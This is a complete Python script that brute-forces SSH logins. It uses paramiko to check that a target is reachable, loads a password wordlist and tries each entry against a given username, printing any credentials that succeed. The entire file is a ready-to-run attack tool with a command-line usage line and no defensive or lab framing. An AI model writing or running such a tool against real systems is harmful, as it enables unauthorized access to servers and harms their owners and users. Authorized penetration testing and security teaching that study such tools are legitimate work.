import paramiko
import socket
import sys

def check_target(host, port=22, timeout=3):
	try:
		with socket.create_connection((host, port), timeout=timeout):
			print(f"[✔] Target {host}:{port} is reachable.")
	except KeyboardInterrupt:
		print("\nScan interrupted by user.")
		sys.exit()
	except Exception:
		print(f"[✗] Cannot reach {host}:{port}")
		print("===============================================================")
		sys.exit(1)

def check_passlist(filepath):
	try:
		with open(filepath, 'r') as file:
			pass_lst = [line.strip() for line in file if line.strip()]
			return pass_lst
	except Exception:
		print(f"Password list {filepath} not found")
		sys.exit(1)

def ssh_login(target, username, password):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(target, username=username, password=password, timeout=3)
		return True
	except KeyboardInterrupt:
		print("\nScan interrupted by user.")
		sys.exit()
	except paramiko.AuthenticationException:
		return False
	except Exception:
		print(f"[!] Connection error...")
		return False
	finally:
		client.close()

def ssh_brute_force(target, username, passlst_path):
	print("===============================================================")
	print(f"[+] Target:\t\t{target}")
	print(f"[+] Username:\t\t{username}")
	print(f"[+] Wordlist:\t\t{passlst_path}")
	check_target(target)
	print("===============================================================")
	print("Starting SSH brute-force...")
	print("===============================================================")

	pass_lst = check_passlist(passlst_path)

	for passwd in pass_lst:
		print(f"[~] Trying: {username}:{passwd}")
		if ssh_login(target, username, passwd):
			print("===============================================================")
			print(f"[✔] Success! Username: {username} | Password: {passwd}")
			print("===============================================================")
			return

	print("===============================================================")
	print("[✗] No valid credentials found.")
	print("===============================================================")

if __name__ == "__main__":
	if len(sys.argv) != 4:
		print("Usage: python ssh_brute_force.py <target> <username> <passlist>")
	else:
		target = sys.argv[1]
		username = sys.argv[2]
		passlst_path = sys.argv[3]
		ssh_brute_force(target, username, passlst_path)